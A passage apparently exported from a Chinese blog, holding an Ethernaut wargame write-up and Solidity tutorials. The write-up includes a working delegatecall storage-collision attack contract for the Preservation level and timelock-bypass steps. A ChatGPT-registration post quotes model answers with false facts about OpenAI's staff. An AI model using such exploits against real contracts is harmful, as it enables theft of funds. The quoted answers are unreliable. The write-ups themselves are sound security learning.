= _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance &gt;= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` of tokens from `from` to `to`.\r\n     *\r\n     * This internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` cannot be the zero address.\r\n     * - `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance &gt;= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\r\n            // decrementing then incrementing.\r\n            _balances[to] += amount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n     * the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance &gt;= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\r\n     *\r\n     * Does not update the allowance amount in case of infinite allowance.\r\n     * Revert if not enough allowance is available.\r\n     *\r\n     * Might emit an {Approval} event.\r\n     */\r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance &gt;= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * will be transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n\r\n    /**\r\n     * @dev Hook that is called after any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * has been transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}\r\n\r\n注意：\r\n\r\n使用solidity0.4.17（或更高版本）的语法\r\n调用者必须处理false来自returns (bool success).\r\n调用者不得假设false永远不会返回！\r\n\r\n\r\n函数解析：\r\n\r\n构造函数，给令牌名称和符号\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n返回令牌的名称 - 例如\"MyToken\"。\r\n可选 -\r\n此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n返回令牌的符号。例如“HIX”。\r\n可选 -\r\n此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n返回令牌使用的小数位数 -\r\n例如8，表示将令牌数量除以100000000得到其用户表示。\r\n可选 -\r\n此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n返回代币总供应量。\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n返回地址为account的另一个帐户的帐户余额。\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n将_value令牌数量转移到地址_to，并且必须触发Transfer事件。如果消息调用者的帐户余额没有足够的代币可花费，则该函数应该throw。\r\n注意 0\r\n值的传输必须被视为正常传输并触发Transfer事件。\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n允许_spender多次从您的帐户中提款，最多不超过_value金额。如果再次调用此函数，它会用\r\n覆盖当前的容差_value。\r\n注意：为了防止像这里描述和讨论的攻击媒介，客户应该确保创建用户界面时，他们首先将允许额度设置为0，然后再为同一支出者将其设置为另一个值。虽然合约本身不应该强制执行它，以允许与之前部署的合约向后兼容\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n将amount令牌数量从 address _from转移到\r\naddress _to，并且必须触发Transfer事件。\r\n该transferFrom方法用于撤回工作流程，允许合约代表您转移代币。例如，这可以用于允许合同代表您转移代币和/或以子货币收取费用。该功能应该throw，除非_from帐户通过某种机制故意授权消息的发送者。\r\n注意 0\r\n值的传输必须被视为正常传输并触发Transfer事件。\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\nspender返回仍允许从owner中提取的金额。\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n随机数\r\n题目源码里面有个bolck.timestamp\r\n\r\nblock.timestamp表示当前区块何时被挖出来的\r\nnow表示当前时间戳信息\r\n\r\n\r\n\r\nblock.coinbase表示挖当前区块的矿工地址\r\nblock.difficulty表示这个区块的挖矿难度\r\nblovk.gaslimit表示交易中所限制的最大的gas值\r\nblock.number表示当前区块的高度\r\n\r\n题目要求我们账户代币余额为0\r\n有个修饰器，要求\r\n    if (msg.sender == player) {\r\n      require(block.timestamp &gt; timeLock);\r\n      _;\r\n    } else {\r\n     _;\r\n    }\r\n  } \r\n但是因为uint public timeLock = block.timestamp + 10 * 365 days;\r\n修饰器对transfer函数进行限定，所以要求无法实现\r\n了解ERC20之后知道转账除了transfer()函数外还有一种方法，就是approve()和transferFrom()结合使用\r\n\r\n先调用approve()，允许代表所有者spender花费amount的代币数量。\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool);\r\n\r\n再调用transferFrom()，将批准的令牌amount从所有者from帐户转移到上一步中批准to的地址中。\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool);\r\n\r\n\r\n注意：最后用transferFrom()转账时，要使用被批准账户spender来调用该函数才能成功\r\noverride:子合约重写了父合约中的函数，需要加上override关键字。\r\n\r\n17.Preservation\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Preservation {\r\n\r\n  // public library contracts \r\n  address public timeZone1Library;\r\n  address public timeZone2Library;\r\n  address public owner; \r\n  uint storedTime;\r\n  // Sets the function signature for delegatecall\r\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\r\n\r\n  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\r\n    timeZone1Library = _timeZone1LibraryAddress; \r\n    timeZone2Library = _timeZone2LibraryAddress; \r\n    owner = msg.sender;\r\n  }\r\n \r\n  // set the time for timezone 1\r\n  function setFirstTime(uint _timeStamp) public {\r\n    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\r\n  }\r\n\r\n  // set the time for timezone 2\r\n  function setSecondTime(uint _timeStamp) public {\r\n    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\r\n  }\r\n}\r\n\r\n// Simple library contract to set the time\r\ncontract LibraryContract {\r\n\r\n  // stores a timestamp \r\n  uint storedTime;  \r\n\r\n  function setTime(uint _time) public {\r\n    storedTime = _time;\r\n  }\r\n}\r\n题目要求我们取代成为第一个合约的owner\r\n\r\n反编译一手发现owner存储在storage2\r\n看下能不能尝试改变\r\n\r\nPreservation Contract\r\n\r\n定义了一些状态变量，其中第一个和第二个变量保存库的地址，第三个变量是我们需要存储地址的所有者。这些地址是在构造函数中预定义的，无法更改。\r\n\r\nLibrary Contract\r\n这定义了一个storedTime在 slot 0\r\n中调用的变量，它映射到address public timeZone1Library保存合约中的变量。\r\n该函数setTime()接受一个由我们控制并存储在上述变量中的输入。\r\n\r\n分析如何修改owner：\r\n以合同为例。当Preservation合约执行setTime(100)时，它会通过delegatecall调用LibraryContract.setTime(100)\r\n如果LibraryContract修改状态，它不会修改自己的状态，而是修改调用者（Preservation）的状态！\r\n这意味着当LibraryContract.setTime更新storedTime状态变量时，不是从它自己的合约更新变量，而是更新调用者合约的slot0中的变量，即timeZone1Library地址。\r\n执行setSecondTime函数时会发生同样的事情，它将更新合约slot0中的变量。Preservation\r\n攻击合约\r\ncontract delegateHack{\r\n  address public timeZone1Library;\r\n  address public timeZone2Library;\r\n  address public owner;\r\n\r\n  Preservation add;\r\n\r\n  constructor(address _addr) public {\r\n      add=Preservation(_addr);\r\n  }\r\n\r\n  function exploit() external{\r\n    add.setFirstTime(uint256(uint160(address(this))));\r\n    add.setFirstTime(uint256(uint160(msg.sender)));\r\n    require(add.owner()==msg.sender,\"hack failed\");\r\n    }\r\n\r\n  function setTime(uint _owner) public {\r\n      owner = address(uint160(_owner));\r\n    }\r\n}\r\n最后那个setTime函数一开始写成这样是错的：\r\n  function setTime(address _owner) public{\r\n    owner = _owner;\r\n  }\r\n可能是因为和源码的不一样导致owner的地址一直无法改变\r\n部署一下使用exploit函数即可\r\n\r\n18.Recovery\r\ncreate和create2（在之前写的solidity进阶里面有）\r\n在合约中创建新合约\r\n\r\n以太坊合约的地址计算（https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed/761#761）\r\n以太坊合约的地址是根据其创建者的地址 ( ) 和创建者发送的交易数量 (\r\n)确定性计算的。 The sender and\r\nnonce are RLP encoded and then hashed with\r\nKeccak-256.\r\n在solidity中：\r\n//  nonce 为 0 时生成的地址\r\nnonce0= \r\naddress(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x80))))));\r\nnonce1= address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x01))))));\r\n\r\n注意：在这题中\r\n\r\n发送者_origin是Recover合约本身\r\nnonce\r\n是合约本身创建的合约编号。需要记住的重要一点：合约的随机数从 1\r\n而不是 0 开始！\r\n\r\n\r\ncontract locate{\r\n  address public lostaddr = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0xe28517966fff65C678F1393b121ABF262A7Df53D\r\n), bytes1(0x01))))));\r\n}\r\n\r\n注意：address(0xe28517966fff65C678F1393b121ABF262A7Df53D )是本题中的发送者。\r\n\r\n\r\n得到的这个地址把他拿到区块链浏览器上看看来源\r\n\r\n\r\n确定是丢失的地址\r\n部署该地址的Recover合约，并且调用selfdestruct函数把钱转走就完成了\r\n\r\n","slug":"Ethernaut题解","date":"2023-03-24T15:30:12.000Z","categories_index":"","tags_index":"solidity靶场","author_index":"cocoZ"},{"id":"462812fbbc64f9c8b5d4c209bcb7fd5a","title":"ChatGPT的搭建","content":"什么是ChatGPT\r\n\r\n我是 Assistant，一个由 OpenAI\r\n训练的大型语言模型。我可以回答您的问题，并帮助您了解更多关于特定主题的信息。我并不具备自己的意识，只能通过我所学到的知识来回答问题。如果您有任何其他问题，请随时问我。我很乐意帮助您。\r\n—ChatGPT\r\n\r\n什么是OpenAI\r\n\r\nOpenAI是一家人工智能研究机构，致力于通过研究人工智能技术来推进人类的发展。它由一群来自业界和学术界的研究人员和专家组成，包括伯克利加州大学的\r\nYann LeCun 和加州理工学院的 Ian Goodfellow\r\n等。OpenAI的目标是通过开发智能系统来提高人类生活的质量，并帮助人类应对未来的挑战。它已经开发了许多不同的人工智能技术，其中包括机器翻译、自然语言处理、图像分类和语音识别等。OpenAI还与其他研究机构和企业合作，共同开发更多的人工智能技术。\r\n—ChatGPT\r\n\r\n如何注册ChatGPT\r\n\r\n首先要在设备上开启全局代理\r\n访问ChatGPT登录页开始注册（https://openai.com/blog/chatgpt）\r\n根据屏幕指示操作后需要手机号验证\r\n在这里ChatGPT不支持China，所以需要买一个海外的手机号\r\nhttps://sms-activate.org/\r\n\r\n\r\n注册该网站的账号后使用支付宝充值2美元之后，在左侧搜索框输入OpenAI\r\n\r\n买一个手机号\r\n\r\n刚开始买了印度尼西亚的手机号收不到验证码，后来买了个美国的号码就ok了，输入验证码就注册成功\r\n\r\n\r\nChatGPT for Google插件\r\n\r\n搜索ChatGPT for Google之后添加到插件\r\n\r\n\r\n谷歌搜索的右侧就会出现ChatGPT的答案\r\n参考文章https://zblogs.top/how-to-register-openai-chatgpt-in-china/\r\n","slug":"ChatGPT","date":"2023-03-20T04:15:54.000Z","categories_index":"","tags_index":"ChatGPT","author_index":"cocoZ"},{"id":"26cdbf141378457625c3c7f264148e8f","title":"solidity进阶","content":"solidity进阶\n16.函数重载\n重载\nsolidity中允许函数进行重载（overloading），即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，solidity不允许修饰器（modifier）重载。\n函数重载\n举个例子，我们可以定义两个都叫saySomething()的函数，一个没有任何参数，输出\"Nothing\"；另一个接收一个string参数，输出这个string。\nfunction saySomething() public pure returns(string memory){\n    return(\"Nothing\");\n}\n\nfunction saySomething(string memory something) public pure returns(string memory){\n    return(something);\n}\n\n最终重载函数在经过编译器编译后，由于不同的参数类型，都变成了不同的函数选择器（selector）。(选择器在29的内容)\n实参匹配（Argument Matching）\n在调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。 如果出现多个匹配的重载函数，则会报错。下面这个例子有两个叫f()的函数，一个参数为uint8，另一个为uint256：\n    function f(uint8 _in) public pure returns (uint8 out) {\n        out = _in;\n    }\n\n    function f(uint256 _in) public pure returns (uint256 out) {\n        out = _in;\n    }\n\n我们调用f(50)，因为50既可以被转换为uint8，也可以被转换为uint256，因此会报错。\n17.库合约\n库函数\n库函数是一种特殊的合约，为了提升solidity代码的复用性和减少gas而存在。库合约一般都是一些好用的函数合集（库函数），由大神或者项目方创作，咱们站在巨人的肩膀上，会用就行了。\n库函数和普通合约的不同：\n1.不能存在状态变量\n2.不能够继承或被继承\n3.不能接受以太币\n4.不可以被销毁\nString库合约\nString库合约是将uint256类型转换为相应的string类型的代码库，样例代码如下：\nlibrary Strings {\n    bytes16 private constant _HEX_SYMBOLS = \"0123456789abcdef\";\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\n     */\n    function toString(uint256 value) public pure returns (string memory) {\n        // Inspired by OraclizeAPI's implementation - MIT licence\n        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol\n\n        if (value == 0) {\n            return \"0\";\n        }\n        uint256 temp = value;\n        uint256 digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\n     */\n    function toHexString(uint256 value) public pure returns (string memory) {\n        if (value == 0) {\n            return \"0x00\";\n        }\n        uint256 temp = value;\n        uint256 length = 0;\n        while (temp != 0) {\n            length++;\n            temp &gt;&gt;= 8;\n        }\n        return toHexString(value, length);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\n     */\n    function toHexString(uint256 value, uint256 length) public pure returns (string memory) {\n        bytes memory buffer = new bytes(2 * length + 2);\n        buffer[0] = \"0\";\n        buffer[1] = \"x\";\n        for (uint256 i = 2 * length + 1; i &gt; 1; --i) {\n            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];\n            value &gt;&gt;= 4;\n        }\n        require(value == 0, \"Strings: hex length insufficient\");\n        return string(buffer);\n    }\n}\n\n他主要包含两个函数，toString()将uint256转为string，toHexString()将uint256转换为16进制，在转换为string。\n如何使用库合约\n1.利用using for指令\n指令using A for B;可用于附加库函数（从库 A）到任何类型（B）。添加完指令后，库A中的函数会自动添加为B类型变量的成员，可以直接调用。注意：在调用的时候，这个变量会被当作第一个参数传递给函数：\n    // 利用using for指令\n    using Strings for uint256;\n    function getString1(uint256 _number) public pure returns(string memory){\n        // 库函数会自动添加为uint256型变量的成员\n        return _number.toHexString();\n    }\n\n2.通过库合约名称调用库函数\n    // 直接通过库合约名调用\n    function getString2(uint256 _number) public pure returns(string memory){\n        return Strings.toHexString(_number);\n    }\n\n\n\nString：将uint256转换为String\n\n\nAddress：判断某个地址是否为合约地址\n\n\nCreate2：更安全的使用Create2 EVM opcode\n\n\nArrays：跟数组相关的库函数\n\n\n18.Import\nsolidity支持利用import关键字导入其他源代码中的合约，让开发更加模块化。\nimport用法\n\n\n通过源文件相对位置导入，eg：\n\n\n文件结构\n├── Import.sol\n└── Yeye.sol\n\n// 通过文件相对位置import\nimport './Yeye.sol';\n\n\n\n通过源文件网址导入网上的合约，eg：\n\n\n// 通过网址引用\nimport 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol';\n\n\n\n通过npm的目录导入，eg：\n\n\nimport '@openzeppelin/contracts/access/Ownable.sol';\n\n\n\n通过全局符号导入特定的合约，eg：\n\n\nimport {Yeye} from './Yeye.sol';\n\n\n\n引用(import)在代码中的位置为：在声明版本号之后，在其余代码之前。\n\n\n19.接受ETH\nSolidity支持两种特殊的回调函数，receive()和fallback()，他们主要在两种情况下被使用：\n\n\n接收ETH\n\n\n处理合约中不存在的函数调用（代理合约proxy contract）\n\n\n注意⚠️：在solidity 0.6.x版本之前，语法上只有 fallback() 函数，用来接收用户发送的ETH时调用以及在被调用函数签名没有匹配到时，来调用。 0.6版本之后，solidity才将 fallback() 函数拆分成 receive() 和 fallback() 两个函数。\n接受ETH函数receive\nreceive()只用于处理接收ETH。一个合约最多有一个receive()函数，声明方式与一般函数不一样，不需要function关键字：receive() external payable { ... }。receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable。\n当合约接收ETH的时候，receive()会被触发。receive()最好不要执行太多的逻辑因为如果别人用send和transfer方法发送ETH的话，gas会限制在2300，receive()太复杂可能会触发Out of Gas报错；如果用call就可以自定义gas执行更复杂的逻辑（这三种发送ETH的方法我们之后会讲到）。\n可以在receive()里发送一个event，eg：\n    // 定义事件\n    event Received(address Sender, uint Value);\n    // 接收ETH时释放Received事件\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n\n有些恶意合约，会在receive() 函数（老版本的话，就是 fallback() 函数）嵌入恶意消耗gas的内容或者使得执行故意失败的代码，导致一些包含退款和转账逻辑的合约不能正常工作，因此写包含退款等逻辑的合约时候，一定要注意这种情况。\n回退函数fallback\nfallback()函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约proxy contract。fallback()声明时不需要function关键字，必须由external修饰，一般也会用payable修饰，用于接收ETH:fallback() external payable { ... }。\n我们定义一个fallback()函数，被触发时候会释放fallbackCalled事件，并输出msg.sender，msg.value和msg.data:\n    // fallback\n    fallback() external payable{\n        emit fallbackCalled(msg.sender, msg.value, msg.data);\n    }\n\nreceive和fallback的区别\nreceive和fallback都能够用于接收ETH，他们触发的规则如下：\n触发fallback() 还是 receive()?\n           接收ETH\n              |\n         msg.data是空？\n            /  \\\n          是    否\n          /      \\\nreceive()存在?   fallback()\n        / \\\n       是  否\n      /     \\\nreceive()   fallback()\n\n简单来说，合约接收ETH时，msg.data为空且存在receive()时，会触发receive()；msg.data不为空或不存在receive()时，会触发fallback()，此时fallback()必须为payable。\nreceive()和payable fallback()均不存在的时候，向合约发送ETH将会报错。\n20.发送ETH\n接受ETH合约\n我们先部署一个接收ETH合约ReceiveETH。ReceiveETH合约里有一个事件Log，记录收到的ETH数量和gas剩余。还有两个函数，一个是receive()函数，收到ETH被触发，并发送Log事件；另一个是查询合约ETH余额的getBalance()函数。\ncontract ReceiveETH {\n    // 收到eth事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    // receive方法，接收eth时被触发\n    receive() external payable{\n        emit Log(msg.value, gasleft());\n    }\n    \n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n}\n\n部署ReceiveETH合约后，运行getBalance()函数，可以看到当前合约的ETH余额为0。\n发送ETH合约\n我们将实现三种方法向ReceiveETH合约发送ETH。首先，先在发送ETH合约SendETH中实现payable的构造函数和receive()，让我们能够在部署时和部署后向合约转账。\ncontract SendETH {\n    // 构造函数，payable使得部署的时候可以转eth进去\n    constructor() payable{}\n    // receive方法，接收eth时被触发\n    receive() external payable{}\n}\n\ntransfer\n\n\n用法是接收方地址.transfer(发送ETH数额)。\n\n\ntransfer()的gas限制是2300，足够用于转账，但对方合约的fallback()或receive()函数不能实现太复杂的逻辑。\n\n\ntransfer()如果转账失败，会自动revert（回滚交易）。\n\n\n代码样例，注意里面的_to填ReceiveETH合约的地址，amount是ETH转账金额：\n// 用transfer()发送ETH\nfunction transferETH(address payable _to, uint256 amount) external payable{\n    _to.transfer(amount);\n}\n\nsend\n\n\n用法是接收方地址.send(发送ETH数额)。\n\n\nsend()的gas限制是2300，足够用于转账，但对方合约的fallback()或receive()函数不能实现太复杂的逻辑。\n\n\nsend()如果转账失败，不会revert。\n\n\nsend()的返回值是bool，代表着转账成功或失败，需要额外代码处理一下。\n\n\n代码样例：\n// send()发送ETH\nfunction sendETH(address payable _to, uint256 amount) external payable{\n    // 处理下send的返回值，如果失败，revert交易并发送error\n    bool success = _to.send(amount);\n    if(!success){\n        revert SendFailed();\n    }\n}\n\ncall\n\n\n用法是接收方地址.call{value: 发送ETH数额}(\"\")。\n\n\ncall()没有gas限制，可以支持对方合约fallback()或receive()函数实现复杂逻辑。\n\n\ncall()如果转账失败，不会revert。\n\n\ncall()的返回值是(bool, data)，其中bool代表着转账成功或失败，需要额外代码处理一下。\n\n\n代码样例：\n// call()发送ETH\nfunction callETH(address payable _to, uint256 amount) external payable{\n    // 处理下call的返回值，如果失败，revert交易并发送error\n    (bool success,) = _to.call{value: amount}(\"\");\n    if(!success){\n        revert CallFailed();\n    }\n}\n\n三者的选择\n\n\ncall没有gas限制，最为灵活，是最提倡的方法；\n\n\ntransfer有2300 gas限制，但是发送失败会自动revert交易，是次优选择；\n\n\nsend有2300 gas限制，而且发送失败不会自动revert交易，几乎没有人用它。\n\n\n21.调用其他合约\n调用已部署合约\n开发者写智能合约来调用其他合约，这让以太坊网络上的程序可以复用，从而建立繁荣的生态。很多web3项目依赖于调用其他合约，比如收益农场（yield farming）。这一讲，我们介绍如何在已知合约代码（或接口）和地址情况下调用目标合约的函数。\n目标合约\n先写一个简单的合约OtherContract来调用。\ncontract OtherContract {\n    uint256 private _x = 0; // 状态变量_x\n    // 收到eth的事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // 如果转入ETH，则释放Log事件\n        if(msg.value &gt; 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // 读取_x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n\n这个合约包含一个状态变量_x，一个事件Log在收到ETH时触发，三个函数：\n\n\ngetBalance(): 返回合约ETH余额。\n\n\nsetX(): external payable函数，可以设置_x的值，并向合约发送ETH。\n\n\ngetX(): 读取_x的值。\n\n\n调用OtherContract合约\n（先贴个源码吧，本来以为要创建两个文件的，只要一个文件部署两个合约就可以了）\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract OtherContract {\n    uint256 private _x = 0; // 状态变量x\n    // 收到eth事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // 如果转入ETH，则释放Log事件\n        if(msg.value &gt; 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // 读取x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n\ncontract CallContract{\n    function callSetX(address _Address, uint256 x) external{\n        OtherContract(_Address).setX(x);\n    }\n\n    function callGetX(OtherContract _Address) external view returns(uint x){\n        x = _Address.getX();\n    }\n\n    function callGetX2(address _Address) external view returns(uint x){\n        OtherContract oc = OtherContract(_Address);\n        x = oc.getX();\n    }\n\n    function setXTransferETH(address otherContract, uint256 x) payable external{\n        OtherContract(otherContract).setX{value: msg.value}(x);\n    }\n}\n\n我们可以利用合约的地址和合约代码（或接口）来创建合约的引用：_Name(_Address)，其中_Name是合约名，_Address是合约地址。然后用合约的引用来调用它的函数：_Name(_Address).f()，其中f()是要调用的函数。\n下面我们介绍4个调用合约的例子，在remix中编译合约后，分别部署OtherContract和CallContract：(还没怎么搞得懂)\n\n\n\n1.传入合约地址\n我们可以在函数里传入目标合约地址，生成目标合约的引用，然后调用目标函数。以调用OtherContract合约的setX函数为例，我们在新合约中写一个callSetX函数，传入已部署好的OtherContract合约地址_Address和setX的参数x：\n    function callSetX(address _Address, uint256 x) external{\n        OtherContract(_Address).setX(x);\n    }\n\n复制OtherContract合约的地址，填入callSetX函数的参数中，成功调用后，调用OtherContract合约中的getX验证x变为123\n\n\n2.传入合约变量\n我们可以直接在函数里传入合约的引用，只需要把上面参数的address类型改为目标合约名，比如OtherContract。下面例子实现了调用目标合约的getX()函数。\n注意该函数参数OtherContract _Address底层类型仍然是address，生成的ABI中、调用callGetX时传入的参数都是address类型\n    function callGetX(OtherContract _Address) external view returns(uint x){\n        x = _Address.getX();\n    }\n\n复制OtherContract合约的地址，填入callGetX函数的参数中，调用后成功获取x的值\n\n3.创建合约变量\n我们可以创建合约变量，然后通过它来调用目标函数。下面例子，我们给变量oc存储了OtherContract合约的引用：\n    function callGetX2(address _Address) external view returns(uint x){\n        OtherContract oc = OtherContract(_Address);\n        x = oc.getX();\n    }\n\n复制OtherContract合约的地址，填入callGetX2函数的参数中，调用后成功获取x的值\n\n4.调用合约并发送ETH\n如果目标合约的函数是payable的，那么我们可以通过调用它来给合约转账：_Name(_Address).f{value: 